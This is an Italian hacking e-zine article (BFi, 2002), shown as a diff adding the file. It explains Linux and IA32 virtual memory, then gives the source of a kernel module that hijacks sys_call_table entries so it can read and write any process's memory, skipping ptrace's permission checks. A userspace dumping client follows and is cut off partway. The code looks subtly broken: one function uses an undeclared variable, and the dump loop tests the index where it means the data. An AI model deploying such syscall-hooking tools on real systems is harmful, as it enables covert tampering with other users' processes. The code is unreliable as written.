@@ -1,0 +1,1943 @@
+==============================================================================
+--------------------[ BFi11-dev - file 10 - 05/06/2002 ]----------------------
+==============================================================================
+
+
+-[ DiSCLAiMER ]---------------------------------------------------------------
+        Tutto il materiale contenuto in BFi ha fini eslusivamente informativi
+        ed educativi. Gli autori di BFi non si riterranno in alcun modo
+        responsabili per danni perpetrati a cose o persone causati dall'uso
+        di codice, programmi, informazioni, tecniche contenuti all'interno
+        della rivista.
+        BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
+        liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
+        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
+        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
+        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
+        ti assumi ogni genere di responsabilita` per l'uso che farai delle
+        informazioni contenute in BFi.
+        Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
+        della rivista: distribuite BFi nella sua forma integrale ed originale.
+------------------------------------------------------------------------------
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ LiNUX ViRTUAL MEM0RY TRiPPiNG
+-----[ twiz <twiz@email.it> - thefly <thefly@acaro.org> 
+
+
+---] La teoria - L'MMU in IA32
+
+Il presupposto centrale della reimplementazione del tool di vecna [1], si 
+fonda sul fatto che il kernel e' colui che gestisce la memoria e quindi e' 
+colui che passa all'mmu le informazioni che le permettono di tradurre gli
+indirizzi da logico a fisici. Una volta che noi abbiamo queste informazioni e
+sappiamo gestirle possiamo tradurre a mano, facendoci una piccola mmu, gli 
+indirizzi che vogliamo andare a leggere.
+In BFi09-19 c'e' un ottimo articolo di Ritz [2] che spiega appunto come la
+MMU funzioni nell'ia32. Ora probabilmente non vorrete andare a leggervi
+quell'articolo abbastanza lungo, ma molto approfondito proprio ora, quindi
+faro' un breve riepilogo delle puntate precedenti, giusto per gettare le basi
+per andare a spiegare come linux gestisca la memoria all'atto pratico, e
+quindi le differenze di approccio apportate al modulo di vecna.
+ 
+Iniziamo col dire che gli indirizzi che un programma utilizza non sono 
+indirizzi fisici. Cosa significa? Significa che se andiamo a printare un 
+indirizzo contenuto in un puntatore, questo indirizzo non sara' una cella
+della ram, ma un indirizzo logico, una sorta di indirizzo temporaneo.
+Questo perche'?
+Beh direi che il bisogno di un indirizzo "temporaneo" (d'ora in poi lo
+chiamero' col suo nome, cioe' indirizzo logico) e' pressoche' ovvio: come
+tutti sappiamo in ogni momento all'interno della RAM ci sono caricati piu'
+processi, ed e' ovvio che in fase di compilazione il nostro amato gcc (o il
+fido programmatore asm) non puo' sapere dove verra' caricato il programma.
+Inoltre se usassimo indirizzi fisici, non potremmo indirizzare tutto l'address
+space che i 32 bit ci mettono a disposizione (a meno di essere fortunati
+possessori di 4 giga di ram), e da qui le altre ovvie conclusioni.
+Appurato il perche' i pocessi utilizzino indirizzi logici, andiamo a vedere
+come nell'ia32 vengano a tutti gli effetti tradotti gli indirizzi.
+L'indirizzo logico subisce due processi di traduzione prima di raggiungere lo
+stato di indirizzo fisico, ovvero la paginazione e la segmentazione.
+
+La *paginazione* e' quell'artificio che divide la memoria in pagine (la
+maggior parte dei sistemi operativi utilizza di default pagine di dimensione
+di 4kb, anche se supporta pagine di dimensione maggiore) e le assegna ad ogni
+processo nel momento in cui questo ha bisogno di scrivere nella memoria.
+Le pagine non vengono assegnate in modo contiguo ad un processo, ma secondo
+vari algoritmi come il best-fit, first-fit etc, tuttavia questa non e' la sede
+per approfondire oltre.
+Ora, visto che a tutti gli effetti quando un dato viene caricato in memoria
+potrebbe finire in qualunque zona della memoria, le cpu all'interno della
+Memory Management Unit hanno delle tabelle di traduzione dette page tables,
+una per ogni pagina (torneremo su questo dopo, parlando della sua
+implementazione in Linux).
+La *segmentazione* invece divide il programma in segmenti: quelli piu'
+comunemente usati sono il segmento text, che contiene il codice, il segmento
+dati, che contiene i dati statici e le variabili globali, e il segmento dove
+viene caricato lo stack.
+Questo permette al programmatore di dividere il suo spazio in piu' spazi di
+indirizzamento e far puntare gli indirizzi all'interno del segmento
+relativamente a se stesso.
+Ogni segmento sara' quindi una partizione del suo address space, indipendente
+dagli altri. Segmenti diversi possono avere lunghezza diversa che puo'
+cambiare durante l'esecuzione.
+Un esempio calzante per spiegare l'utilizzo della paginazione e
+segmentazione assieme puo' essere quello di un libro. Il libro viene diviso
+in capitoli, ognuno con una sua lunghezza, che puo' essere espanso (pensiamo
+ad un quaderno ad anelli :P ).
+Bene il capitolo e' il segmento, ed all'interno del segmento abbiamo le
+parole, che vengono lette relativamente al capitolo stesso (cosi come diremmo
+"la 546esima parola del capitolo 3, cosi la CPU interpreta gli indirizzi in 2
+parti, il segmento e l'indirizzo relativo ad esso).
+Le pagine comporranno il segmento e saranno di dimensione fissa. Quando non
+avremo piu' bisogno di una pagina in un segmento la potremo cancellare e
+rendere disponibile per chi ne avesse bisogno. Sperando che l'esempio calzi e
+di non esser preso per blasfemo, il passo successivo e' spiegare come tutto
+questo venga implementato in Linux, e come questo sia in relazione con la
+tanto chiaccherata VM (Virtual Memory).
+Il rimando va nuovamente alla lettura dell'articolo di Ritz [2] per sapere
+come siano composti i segment selectors e le flag di ogni pgtable entry.
+
+---] La teoria - L'MMU in Linux
+
+Iniziamo a rompere questo quadretto: la segmentazione e' usata davvero
+pochissimo in Linux, soprattutto perche' le altre architetture utilizzano
+pochi segmenti.
+La Segmentation Unit, che contiene le tabelle di traduzione dei segmenti, non
+viene mai toccata in linux e questo significa che viene compilata al boot e
+rimane sempre la stessa.
+In Linux vengono usati questi segment:
+  - 1 segmento dati per il kernel
+  - 1 segmento testo per il kernel
+  - 1 segmento dati per gli utenti
+  - 1 segmento testo per gli utenti
+  - 1 TSS per ogni processore
+  - 1 LDT per ogni processore
+NB(nel 2.2 vi era 1 TSS per processo ed un LDT sharato da tutti i processi)
+
+Il TSS e' il segmento dove viene salvato lo stato di un processo (i suoi
+registri), e LDT (Local Descriptor Table) dove un processo puo' voler 
+aggiungere altri suoi segmenti. Quindi come prima cosa l'indirizzo logico
+viene fatto passare per la Segmentation Unit che lo traduce in indirizzo
+lineare.
+ 
+Ora noi faciamo passare l'indirizzo lineare per la Paging Unit che ne fara'
+uscire l'indirizzo fisico, che puo' essere mandato alla RAM.
+Come e' composta la Paging Unit in linux? Allora prima di tutto diciamo come
+e' composta secondo INTEL.
+Un indirizzo lineare viene diviso in 3 parti.
+Allora, noi sommiamo i 10 bit piu' significativi al registro all'indirizzo
+base della page directory, ottenendo la pdentry, qui leggeremo l'indirizzo di
+base della relativa page table. A questo indirizzo sommeremo i secondi 10 bit
+dell'indirizzo lineare, questa somma ci dara' l'indirizzo della pagina. Noi 
+pero' vogliamo leggere la parola, quindi aggiungendo i 12 bit dell'offset
+all'indirizzo della pagina otterremo l'indirizzo fisico della parola
+all'interno della ram (che puo' essere visto come un grosso array).
+Linux pero' usa un "hack" per garantire la portabilita' su sistemi come quello
+SPARC che usa paginazione a 3 livelli e cioe' tra la page directory e la page
+table viene inserita la page middle directory.
+Il principio e' ancora lo stesso (ricordiamoci che la paginazione a 3 livelli
+viene usato su sitemi a 64bit, dove una paginazione a 2 livelli porterebbe a
+della tabelle immense, nell'ordine delle decine di milioni di entries).
+
+Ogni volta che un processo indirizza la memoria, questo passa per queste due
+unita' di traduzione, che hanno le tabelle in ram.
+Cio' comporterebbe un rallentamento, in quanto ogni accesso porterebbe ad una
+decina di letture tra selettori di segmenti e tabelle di paginazione, con un
+ovvio overhead.
+Per questo esiste la TLB, cioe' Translation Lookaside Buffers, che e' una
+tabella associativa di indirizzi logici -> fisici tradotti di recente.
+In questo modo la cpu dovra' andare a tradurre un indirizzo solo in caso di
+TLB miss, cioe' quando manca l'entry, che per il principio di localita'
+significa uno speed-up niente male.
+La TLB viene gestita anch'essa dal kernel, quindi spetta al kernel invalidare
+un entry della tlb quando una traduzione viene a cambiare, ad esempio quando
+modifichiamo una ptentry.
+Tutte queste informazioni, quali le page tables, le entry della TLB etc sono
+contenute in strutture, contenute nella struct task_struct, che rappresenta
+l'essenza di un processo.
+
+Ogni volta che avviene un context switch, cioe' si passa dall'esecuzione di
+un processo ad un altro, vengono caricate le page tables del nuovo processo,
+invalidate le entries del TLB, ricaricati i valori dei registri, il PC etc
+etc.
+Ora, "visto che il kernel tiene le page tables di ogni processo, perche'
+invece di aspettare che vengano caricate in memoria dal kernel quando lo 
+esegue, non le scorro gia' da solo e mi traduco a mano l'indirizzo logico 
+secondo QUELLE page tables?".
+Tra l'altro, come gia' detto, tutti i processi sharano la tabella dei
+segmenti, quindi non dobbiamo andara a tradurla.
+L'unico problema che ci si pone e': una volta che abbiamo l'indirizzo fisico
+in cui leggere, come possiamo referenziarlo direttamente? Infatti questo
+indirizzo verrebbe nuovamente tradotto attraverso le page tables del kernel...
+e saremmo punto ed a capo.
+Quindi dobbiamo fare il processo contrario passando per le tabelle del kernel,
+e cioe' scoprire quale indirizzo logico del kernel corrisponde a
+quell'indirizzo fisico. Una volta fatto questo cio' che rimane non e' altro
+che gestire i problemi procurati dalla VM, e cioe' pagine swapped out,
+mappaggio nell'address space del kernel della suddetta area, e lettura della
+stessa.
+Questo puo' essere fatto senza problemi dal kernel, quindi saltiamo tutto il
+wrapping delle syscalls che dovevamo sperare che il processo andasse ad
+eseguire.
+
+Vediamo in dettaglio le strutture e macro utilizzate:
+
+include/linux/sched.h :212
+
+struct mm_struct {
+        struct vm_area_struct * mmap;           /* list of VMAs */
+        rb_root_t mm_rb;
+        struct vm_area_struct * mmap_cache;     /* last find_vma result */
+        pgd_t * pgd;
+        atomic_t mm_users;                      /* How many users with user
+        					 * space? 
+        					 */
+        atomic_t mm_count;                      /* How many references to 
+        					 * "struct mm_struct" (users 
+        					 * count as 1)
+        					 */
+        int map_count;                          /* number of VMAs */
+        struct rw_semaphore mmap_sem;
+        spinlock_t page_table_lock;             /* Protects task page tables
+        					 * and mm->rss
+        					 */
+
+        struct list_head mmlist;                /* List of all active mm's.  
+        					 * These are globally strung
+                                                 * together off init_mm.mmlist,
+                                                 * and are protected
+                                                 * by mmlist_lock
+                                                 */
+
+        unsigned long start_code, end_code, start_data, end_data;
+        unsigned long start_brk, brk, start_stack;
+        unsigned long arg_start, arg_end, env_start, env_end;
+        unsigned long rss, total_vm, locked_vm;
+        unsigned long def_flags;
+        unsigned long cpu_vm_mask;
+        unsigned long swap_address;
+
+        unsigned dumpable:1;
+
+        /* Architecture-specific MM context */
+        mm_context_t context;
+};
+
+allora, questa struttura e' la foto della memoria utilizzata da un processo.
+- la vm_area_struct e' una struttura che rappresenta un'area di memoria
+  mmappata.
+- la pgd e' il puntatore alla page global directory.
+- quella serie di unsigned long sono indirizzi di inizio e fine segmenti.
+
+pgd_offset(): riceve come argomento la mm_struct e l'indirizzo virtuale, e ci
+viene ritornato il pgd entry (page middle dir).
+pmd_offset(): riceve come argomento la pgd entry e l'indirizzo e ci viene 
+ritornato il pmd entry.
+pte_offset(): riceve come argomento la pmd entry e l'indirizzo e ci viene
+ritornato il pt entry.
+p*_val(): ritorna il valore dell'entry per tutti e 3 i casi. Le entry non
+vengono utilizzate direttamente perche' spesso, con l'inclusione delle
+HIGHMEM, l'indirizzo e' costituito da 2 parti. .low e .high
+p*_none(): controllano l'esistenza della entry
+p*_bad(): controllano vari flag, ad esempio se e' presente in main memory, se
+puo' essere letta, se e' flaggata dirty (cioe' e' stata modificata) o vi e'
+stato fatto un accesso di recente etc...
+pte_page(): ritorna l'indirizzo della pagina.
+
+handle_mm_fault(): viene laciato l'handler del pagefault, che recupera la
+pagina mancante. Il page fault e' un'interruzione sollevata dalla cpu quando
+vi e' un problema nell'indirizzamento della memoria. Il problema puo' essere
+dovuto ad una pagina che e' stata swapped out, e quindi non piu' presente in
+memoria.
+In questo caso la pagina verra' swapped-in, e l'istruzione che ha causato il
+fault verra' rieseguita. Questa interruzione puo' essere sollevata anche in
+caso venga utilizzato un indirizzo non presente nell'address space del
+processo, o in caso di COW (copy on write), tecnica utilizzata dalla fork()
+etc etc.
+In questo tool viene utilizzata per il primo caso.
+
+find_extend_vma(): questa funzione invece estende l'address space del
+processo. Nel modulo viene usato quando la pagina non e' presente. Quello che
+facciamo e' espandere l'aspace del processo, e tramite handle_mm_fault, gli
+facciamo caricare la pagina che ci interessa (che sia dallo swap o dal
+binario).
+
+flush_page_to_ram()
+flush_icache_page()
+Entrambe le funzioni sono da  utilizzare per garantire la coerenza della
+cache della cpu, dal momento che la pagina che stiamo cercando di accedere si
+trova all'interno della VM di un altro processo e dunque potrebbe essere
+"aliasata" (potrebbe essercene una "seconda copia") nella cache della CPU su
+un'altra line.
+Tuttavia, come dice Dave Miller nella documentazione
+(Documentation/cachetlb.txt [3], consigliato per ulteriori approfondimenti),
+sono obsolete e malmesse, quindi datele per scontate e non indagate oltre :)
+
+kmap(): come detto nella parte teorica, traduce al reverse da indirizzo fisico
+a virtuale, per il kernel (vedasi __va()).
+
+Va fatto un appunto sull'implementazione del modulo. E' stato fatto SMP-safe
+il piu' possibile, vengono utilizzati spinlocks, read_locks e task_locks,
+teoricamente avremo dovuto usare la comunicazione interprocessore, per
+assicurarci che il processo modificato non stesse girando sull'altro
+processore e magari, in caso negativo, che comunque non sia bloccato proprio
+sull'istruzione che modifichiamo, o adiacente ad essa, garantendo una sorta 
+di coerenza. 
+
+---] L'implementazione pratica - idee alla base
+
+Al momento della stesura del codice gli obiettivi erano formalmente due:
+
+Primo: 
+
+Poter leggere da / scrivere su qualunque indirizzo virtuale di un qualsiasi
+pid in esecuzione e per questo era necessario:
+   -  recuperare la task_struct di quel pid (get_task())
+   -  comportarsi da "pseudo-mmu" (avendo la struct mm_struct corretta da
+      task->mm), recuperando l'indirizzo "effettivo" della pagina dalle
+      page tables (p*_offset() / pte_page())
+   -  successivamente recuperarne l'indirizzo virtuale all'interno del
+      kernel (kmap()).
+
+Secondo:
+
+Comodita', ovvero poter ripetere piu' e piu' volte una qualunque operazione,
+sia essa di scrittura, di lettura o di ricerca nel virtual address space di un
+programma, senza dover ogni volta scaricare e ricaricare il modulo in memoria,
+poter cioe' passare parametri differenti (il pid, il virtual addr, 
+l'operazione da svolgere) al modulo lasciandolo sempre, tranquillamente, in
+kernel space.
+A questo punto le soluzioni erano due, o fare tutto cio' attraverso /proc,
+avendo un file di "input", per passare i parametri, e uno di "output", per
+osservare i risultati (o farli stampare direttamente sullo schermo via
+printk), oppure avere delle syscalls ad hoc.
+La scelta e' caduta sulla seconda possibilita', che aveva alcuni vantaggi,
+innanzitutto era piu' semplice da implementare (pensate alla semplicita' di
+passare i parametri nei registri) e piu' "portabile", inoltre era possibile
+svolgere una parte del lavoro in userspace (ad esempio la ricerca), che e'
+sicuramente un terreno piu' tranquillo e, infine, volendo "occultare" il
+modulo (intento che nel codice non e' portato avanti) era la via meno
+appariscente. 
+
+Queste erano le idee alla base della stesura del codice, vediamo ora i
+sorgenti :).
+
+---] L'Implementazione in Kernel Space - dictracy.c
+
+<-| lvmt/dictracy.c |-> 
+/*
+ * Dictracy Loadable Kernel Module   
+ *                          by -  twiz   - twiz@email.it        
+ *                                thefly - thefly@acaro.org
+ *
+ * That module let you investigate, read, search, dump and write the virtual 
+ * address space of a process running.
+ *
+ * From the idea exposed by vecna in rmfbd :
+ *    http://www.s0ftpj.org/bfi/dev/BFi11-dev-06
+ *
+ * Thanks : silvio
+ */
+
+#define __KERNEL__
+#define MODULE
+#define __NR_getvirtaddr  224
+#define __NR_rwfromvirt 223
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <asm/uaccess.h>
+#include <linux/malloc.h>
+#include <linux/sys.h>
+#include <linux/smp_lock.h>
+#include <linux/unistd.h>
+#include <linux/highmem.h>
+#include "dictracy.h"
+
+/* You need to retrieve from System.map the correct address to use that two
+ * functions, if they aren't exported - check from /proc/ksyms
+ *
+ * # nm /usr/src/linux/vmlinux | sort | grep handle_mm_fault
+ * 00000000c011d65c T handle_mm_fault
+ */
+
+int (*handle_mm_fault_e) (struct mm_struct *,struct vm_area_struct *, unsigned long , int ) = (void *)0xc011d65c;
+
+/* Same there */
+
+struct vm_area_struct *(*find_extend_vma_e) (struct mm_struct *, unsigned long)
+= (void *)0xc011e1e4;
+
+extern void* sys_call_table[];
+struct page * getpagefromaddr(unsigned long, struct task_struct *);
+
+/* 
+ * get_task() just does the work of find_task_by_pid(), but adds a read_lock
+ * on the tasklist.
+ */
+
+struct task_struct *get_task(pid_t pid)
+{
+        struct task_struct *p, **htable = &pidhash[pid_hashfn(pid)];
+        read_lock(&tasklist_lock);
+        for(p = *htable; p && p->pid != pid; p = p->pidhash_next)
+                        ;
+        read_unlock(&tasklist_lock);
+        return p;
+}
+
+int getvirtaddr(struct mem_addr *temmem, int pid)
+{
+ struct task_struct *temp;
+
+ if ( (temp = get_task(pid)) == NULL )
+   return 1;
+
+ temmem->startcode = temp->mm->start_code;
+ temmem->endcode = temp->mm->end_code;
+ temmem->startdata = temp->mm->start_data;
+ temmem->enddata = temp->mm->end_data;
+ temmem->startbrk = temp->mm->start_brk;
+ temmem->startstack = temp->mm->start_stack;
+
+ return 0;
+}
+
+/*
+ * If you're used to ptrace code (kernel/ptrace.c) you should recognize
+ * something in the following lines :)
+ */
+struct page * getpagefromaddr(unsigned long addr, struct task_struct *task)
+{
+ pgd_t *pgd;
+ pmd_t *pmd;
+ pte_t *pte;
+ struct vm_area_struct *vma;
+ struct mm_struct *mm;
+
+startpoint:
+
+ task_lock(task);
+ mm = task->mm;
+  if (mm)
+     atomic_inc(&mm->mm_users);
+ task_unlock(task);
+  if (!mm)
+     return NULL;
+
+ spin_lock(&task->mm->page_table_lock);
+
+ pgd = pgd_offset(mm, addr);
+ if (pgd_none(*pgd))
+   goto fault;
+
+ if (pgd_bad(*pgd))
+  {
+   pgd_ERROR(*pgd);
+   goto error;
+  }
+
+ pmd = pmd_offset(pgd, addr);
+ if (pmd_none(*pmd))
+  goto fault;
+
+ if (pmd_bad(*pmd))
+  {
+   pmd_ERROR(*pmd);
+   goto error;
+  }
+
+ pte = pte_offset(pmd, addr);
+
+ spin_unlock(&task->mm->page_table_lock);
+
+ if (!pte_present(*pte))
+   goto fault;
+
+ return pte_page(*pte);
+
+fault:
+ spin_unlock(&task->mm->page_table_lock);
+ vma = find_extend_vma_e(mm, addr);
+ atomic_dec(&mm->mm_users);
+ if ( handle_mm_fault_e(mm, vma, addr, 0) > 0)
+  goto startpoint;
+ else
+  return NULL;
+error:
+ spin_unlock(&task->mm->page_table_lock);
+ atomic_dec(&mm->mm_users);
+ return NULL;
+}
+
+
+int rwfromvirt(int pid, char *buffer, int len, unsigned long addr, int w)
+{
+ struct task_struct *task;
+ struct page *page;
+ char *maddr;
+
+ if ( (task = get_task(pid)) == NULL )
+  return 1;
+
+ page = getpagefromaddr(addr, task);
+  if ( page == NULL )
+   return -1;
+
+ if (w)
+  {
+   if ((!VALID_PAGE(page)) || PageReserved(page))
+     return -2;
+
+   maddr = kmap(page);
+   memcpy(maddr + (addr & ~PAGE_MASK), buffer, len);
+   flush_page_to_ram(page);
+   flush_icache_page(find_extend_vma_e(task->mm, addr), page);
+   kunmap(page);
+  }
+ else
+  {
+   maddr = kmap(page);
+   memcpy(buffer, maddr + (addr & ~PAGE_MASK), len);
+   flush_page_to_ram(page);
+   kunmap(page);
+  }
+ mm = task->mm;
+ atomic_dec(&mm->mm_users);
+ 
+ return 0;
+}
+
+int init_module()
+{
+ sys_call_table[__NR_getvirtaddr] = getvirtaddr;
+ sys_call_table[__NR_rwfromvirt] = rwfromvirt;
+ return 0;
+}
+
+void cleanup_module ()
+{
+ sys_call_table[__NR_getvirtaddr] = NULL;
+ sys_call_table[__NR_rwfromvirt] = NULL;
+ printk("<1>Module Unloadded\n");
+}
+<-X->  
+
+<-| lvmt/dictracy.h |->
+struct mem_addr {
+    unsigned long startcode;
+    unsigned long endcode;
+    unsigned long startdata;
+    unsigned long enddata;
+    unsigned long startbrk;
+    unsigned long startstack;
+};
+<-X->   
+
+All'interno del modulo vengono usate due funzioni (find_extend_vma() e
+handle_mm_fault()), le quali, sebbene prototipate entrambe in 
+include/linux/mm.h, non vengono esportate dal kernel (cat /proc/ksyms | grep
+funzione per controllare).
+Viene quindi utilizzato il metodo discusso da silvio cesare [4] per poterle
+indirizzare, recuperandone l'indirizzo da System.map.
+
+	int (*handle_mm_fault_e) (struct mm_struct *,struct vm_area_struct *,
+	unsigned long , int ) = (void *)0xc011d65c;
+	struct vm_area_struct *(*find_extend_vma_e) (struct mm_struct *,
+	unsigned long) = (void *)0xc011e1e4;
+
+Qualora non foste sicuri che la System.map che avete a disposizione si
+riferisca al kernel effettivamente in uso (ad esempio se la macchina non e'
+la vostra :)) usate nm (man nm) su /usr/src/linux/vmlinux (o comunque su
+quello corretto... ad esempio controllando con un uname -r quale versione sia
+in uso e se esista anche una directory linux-x.y.z/ oltre a linux/, aiutatevi
+anche con lilo.conf... insomma usate la testa :) ).
+Il fatto stesso che vengano prototipate costringe a modificarne il nome.
+
+Come potete vedere il modulo esporta due syscall:
+ 
+#define __NR_getvirtaddr  224
+#define __NR_rwfromvirt 223
+
+La prima e':
+
+int getvirtaddr(struct mem_addr *temmem, int pid)
+
+Questa syscall non fa molto (anzi fa pochissimo) e si limita a recuperare una
+serie di indirizzi virtuali di un processo in esecuzione.
+Come abbiamo visto prima infatti, all'interno della struct mm_struct troviamo
+una serie di "unsigned long", che non sono altro che gli indirizzi virtuali
+dell'inizio del code segment e della sua fine, del data segment, dello stack,
+dell'heap (brk) eccetera (i nomi sono alquanto esplicativi direi).
+La nostra getvirtaddr() non fa altro che, dato un pid, ricercare la
+task_struct corretta (operazione svolta da get_task() che, dato un pid,
+ritorna la struct task_struct del processo scorrendo l'hash table dei pid) e
+passare i vari indirizzi attraverso la struct mem_addr, dichiarata e in
+dictracy.h .
+Questa funzione e' molto utile per sapere da dove iniziare a cercare in
+memoria (ad esempio volendo trovare un buffer del quale conosciamo il
+contenuto) e per confrontare i virtual address di due programmi in esecuzione
+(e relative differenze).
+
+La seconda syscall esportata invece e':
+
+int rwfromvirt(int pid, char *buffer, int len, unsigned long addr, int w)
+
+Questa syscall e' quella che effettivamente raggiunge gli obiettivi :)
+Dato un pid, un indirizzo virtuale e una flag (int w - read / write) si
+occupa di recuperare/scrivere "len" bytes di memoria, copiandone il contenuto
+in buffer, in caso di lettura/dump, oppure sovrascrivendo con il contenuto di
+buffer, nel caso di scrittura (w == 1).
+Recuperata la struttura task_struct corretta (procedimento che e' gia' stato
+discusso per la precedente syscall), viene recuperata la struttura page dal
+virtual address attraverso la funzione:
+
+struct page * getpagefromaddr(unsigned long addr, struct task_struct *task)
+
+La quale tratta l'indirizzo con le varie p*_offset e recupera la struct page
+con pte_page(), occupandosi di gestire eventuali page fault (sezione fault:).
+La page cosi' ottenuta viene poi kmappata (kmap()), in modo da avere
+l'indirizzo virtuale da usare in kernel space per poter leggere e scrivere
+senza doverci preoccupare di cosa lo scheduler stia effettivamente facendo
+girare (current). 
+
+La page, che ovviamente non ci serve piu', viene a questo punto kunmappata.
+                            
+Come scritto anche tra i commenti del codice, chi tra voi abbia gia' avuto
+modo di leggere il codice di ptrace (kernel/ptrace.c) avra' sicuramente notato
+delle somiglianze. 
+In effetti ptrace (man 2 ptrace) permette di leggere/scrivere (in una parola
+di accedere la vm del processo tracciato) attraverso le opzioni
+PTRACE_PEEKTEXT, PTRACE_PEEKDATA, PTRACE_PEEKUSER, PTRACE_POKETEXT,
+PTRACE_POKEDATA, PTRACE_POKEUSER.
+Citando dal man :
+
+       PTRACE_PEEKTEXT, PTRACE_PEEKDATA
+              Reads  a  word  at the location addr in the child's
+              memory, returning the word as  the  result  of  the
+              ptrace call.  Linux does not have separate text and
+              data address spaces, so the two requests  are  cur-
+              rently equivalent.  (data is ignored.)
+
+       PTRACE_POKETEXT, PTRACE_POKEDATA
+              Copies  a  word  from location data in the parent's
+              memory to location addr in the child's memory.   As
+              above, the two requests are currently equivalent.
+
+E ancora:
+
+       On  success,  PTRACE_PEEK*  requests  return the requested
+       data, while other requests return  zero.  
+
+Quindi perche' non fare tutto con ptrace?
+Perche' dictracy.c ci da alcuni (non trascurabili) vantaggi :) (self-promoting
+mode end).
+Innanzi tutto non dobbiamo preoccuparci dei permessi, laddove ptrace
+ritornerebbe un poco cordiale EPERM noi possiamo allegramente leggere da
+qualunque processo in esecuzione.
+In secondo luogo non abbiamo limiti di "dimensioni" (se non quelli imposti
+dall'allocazione di memoria per contenere il buffer) mentre ptrace, che
+sappiamo e' dichiarata:
+
+       long  int ptrace(enum __ptrace_request request, pid_t pid,
+       void * addr, void * data)
+
+puo' al massimo ritornare in caso di PTRACE_PEEK* long int (il puntatore
+void * data, che potrebbe essere utile in questo caso viene ignorato).
+ 
+---] L'implementazione in User Space - memdig.c 
+
+Tra gli obiettivi (ed i "vantaggi") di questa implementazione c'era anche la 
+possibilita' di svolgere una buona parte del lavoro in userland, attraverso
+una sorta di interfaccia verso il modulo che si occupi di chiamare le syscalls
+con i parametri di nostro interesse, di ricevere l'eventuale buffer per il
+dump della memoria, di ricercare una stringa, di passare un buffer per
+sovrascrivere una data area di memoria.
+Il codice che si occupa di tutto cio' e' memdig.c .
+
+<-| lvmt/memdig.c |->
+/*
+ * Memdig.c  
+ *            by -  twiz   - twiz@email.it
+ *                  thefly - thefly@acaro.org
+ *
+ * This is the userspace interface to dictracy module and will let you :
+ *   - get virtual addresses of a process (code start, data start ...) 
+ *   - read and dump from a virtual address
+ *   - write to a particular address
+ *   - search for a string in an arbitrary memory area
+ *
+ */       
+
+#include <stdio.h>
+#include <stdlib.h>
+#include "dictracy.h"
+
+/* Number of hex codes printed on a line during a memory dump */
+
+#define CHARINLINE 22
+
+/*
+ * Two parsing function, just simple asm code to call the syscall exported by
+ * dictracy
+ */
+
+extern int parse_rwvirtaddr(int, char *, int, unsigned long, int);
+extern int parse_getvirtaddr(struct mem_addr *, int);
+
+int traversemem(unsigned long, int, char *, int, int);
+void usage(char *name);
+void mcheck(char *maddr);
+
+main(int argc, char **argv)
+{
+ char *buffer, *temp;
+ struct mem_addr addresses;
+ int pid, fd, ret, size, i, line = 0;
+ unsigned long addr;
+
+ if ( argc != 3 )
+    usage(argv[0]);
+
+/* I'm just too lazy to use getopt :)) */
+
+ if ( strcmp(argv[1], "get") == 0)
+  {
+   pid = atoi(argv[2]);
+   printf("PID examined: %d\n", pid);
+   ret = parse_getvirtaddr(&addresses, pid);
+
+/* Let's check return value of the syscall triggered */ 
+
+    if ( ret == 1 )
+     {
+       fprintf(stderr, "Error in triggering syscall : is the pid correct ?\n");
+       exit(1);
+     }
+
+    if ( ret == -1 )
+     {
+       fprintf(stderr, "Error in retrieving page struct : out of memory\n");
+       exit(1);
+     }
+
+   printf("RESULTS: \n");
+   printf("\tcode_start: \t%p\n", addresses.startcode);
+   printf("\tcode_end: \t%p\n", addresses.endcode);
+   printf("\tdata_start: \t%p\n", addresses.startdata);
+   printf("\tdata_end: \t%p\n", addresses.enddata);
+   printf("\theap_start: \t%p\n", addresses.startbrk);
+   printf("\tstack_start: \t%p\n", addresses.startstack);
+   exit(0);
+
+  }
+
+ if ( strcmp(argv[1], "read") == 0 )
+  {
+   pid = atoi(argv[2]);
+   printf("Insert virtual address to start reading from : ");
+   scanf("%x", &addr);
+   printf("Insert size of memory you want to read : ");
+   scanf("%d", &size);
+
+   buffer = malloc(size);
+   mcheck(buffer);
+   printf("PID examined: %d\n", pid);
+   printf("Reading at virtual address %p %d bytes of memory\n", addr, size);
+   ret = parse_rwvirtaddr(pid, buffer, size, addr, 0);
+
+    if ( ret == 1 )
+     {
+      fprintf(stderr, "Error in triggering syscall: is the pid correct ?\n");
+      exit(1);
+     }
+
+    if ( ret == -1 )
+     {
+      fprintf(stderr, "Error in retrieving page struct : out of memory\n");
+      exit(1);
+     }
+
+    if ( ret == -2 )
+     {
+      fprintf(stderr, "Invalid or Reserved page\n");
+      exit(1);
+     }
+
+printf("Only valid alphanumeric chars would be printed, where not possible a \".\" will be printed\n");
+printf("READ : \n");
+
+for ( i = 0; i < size; i++ )
+  {
+   if ( i == 0xa )
+    {
+     printf("\\n");
+     continue;
+    }
+   if ( i == '\0' )
+    {
+     printf("\\0");
+     continue;
+    }
+   if ( buffer[i] < 0x20 || buffer[i] > 0x7e )   /* check valid ascii value */
+    {
+     printf(".");
+     continue;
+    }
+  printf("%c", buffer[i]);
+ }
+   printf("\n");
+   exit(0);
+ }
+
+if ( strcmp(argv[1], "dump") == 0 )
+ {
+   pid = atoi(argv[2]);
+   printf("Insert virtual address to start reading from : ");
+   scanf("%x", &addr);
+   printf("Insert size of memory you want to dump : ");
+   scanf("%d", &size);
+
+   buffer = (char *)malloc(size);
+   mcheck(buffer);
+   printf("PID examined: %d\n", pid);
+   printf("Dumping %d bytes of memory starting at virtual address : %p\n", size,           addr);
+   ret = parse_rwvirtaddr(pid, buffer, size, addr, 0);
+
+    if ( ret == 1 )
+     {
+      fprintf(stderr, "Error in triggering syscall: is the pid correct ?\n");
+      exit(1);
+     }
+
+    if ( ret == -1 )
+     {
+      fprintf(stderr, "Error in retrieving page struct : out of memory\n");
+      exit(1);
+     }
+
+    if ( ret == -2 )
+     {
+      fprintf(stderr, "Invalid or Reserved page\n");
+      exit(1);
+     }
+
+/* Same as read, except that we print the memory area with hex values */
+
+  for (i = 0; i < size; i++)
+   {
+    if ( line == CHARINLINE )
+      {
+       printf("%02x\n", (unsigned char)buffer[i]);
+       line = 0;
+       continue;
+      }
+    printf("%02x ", (unsigned char)buffer[i]);
+    line++;
+    }
+  printf("\nEnd of memory dump\n");
+  exit(0);
+}
+
